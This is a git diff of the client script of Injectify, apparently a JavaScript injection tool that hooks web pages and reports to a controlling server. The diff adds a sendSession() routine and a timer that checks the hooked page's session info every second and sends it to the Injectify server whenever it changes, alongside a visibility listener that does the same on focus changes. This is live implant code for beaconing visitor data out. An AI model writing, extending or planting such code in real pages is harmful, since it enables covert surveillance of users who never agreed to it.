@@ -267,6 +267,14 @@ window['injectify'] = class Injectify {
 		}
 	}
 	/**
+	 * Sends the session info to the server
+	*/
+	static sendSession() {
+		let sessionInfo = injectify.sessionInfo
+		if (this.debug) console.warn('🕵🏼 Delivered session info to server', sessionInfo)
+		this.send('i', sessionInfo)
+	}
+	/**
 	 * Returns whether injectify is in debug mode or not
 	 * true  - being used in development
 	 * false - console output should be suppressed
@@ -307,7 +315,10 @@ let injectify = window['injectify']
  */
 if (!window['inJl1']) window['inJl1'] = {
 	listeners: {
-		visibility: false
+		visibility: false,
+		timed: {
+			active: false
+		}
 	}
 }
 let global = window['inJl1']
@@ -322,14 +333,13 @@ injectify.connectTime = +new Date
  * Debug helpers
  */
 if (injectify.debug) {
-	console.warn('⚡️ Injectify core.js loaded! --> https://github.com/samdenty99/injectify', injectify.info)
+	console.warn('⚡️ Injectify core.ts loaded! => https://github.com/samdenty99/injectify', injectify.info)
 }
 
 /**
  * Send session info to the Injectify server
  */
-injectify.send('i', injectify.sessionInfo)
-console.log(injectify.sessionInfo)
+injectify.sendSession()
 
 
 /**
@@ -409,7 +419,7 @@ injectify.listener((data, topic) => {
 		global.listeners.visibility = true
 
 		let listener
-		let focusChange = () => injectify.send('i', injectify.sessionInfo)
+		let focusChange = () => injectify.sendSession()
 		
 		/**
 		 * Get the correct hidden listener
@@ -429,6 +439,28 @@ injectify.listener((data, topic) => {
 		 * Add listener
 		 */
 		if (listener) document.addEventListener(listener, focusChange)
+	}
+})();
+
+/**
+ * Session info logger
+ */
+(() => {
+	if (global.listeners.timed.active) {
+		return
+	} else {
+		global.listeners.timed.active = true;
+		(function sessionInfo() {
+			let currentState = JSON.stringify(injectify.sessionInfo)
+			if (currentState !== global.listeners.timed.prevState) {
+				/**
+				 * If the previous state was defined
+				 */
+				if (global.listeners.timed.prevState) injectify.sendSession()
+				global.listeners.timed.prevState = currentState
+			}
+			setTimeout(sessionInfo, 1000)
+		})()
 	}
 })()
 
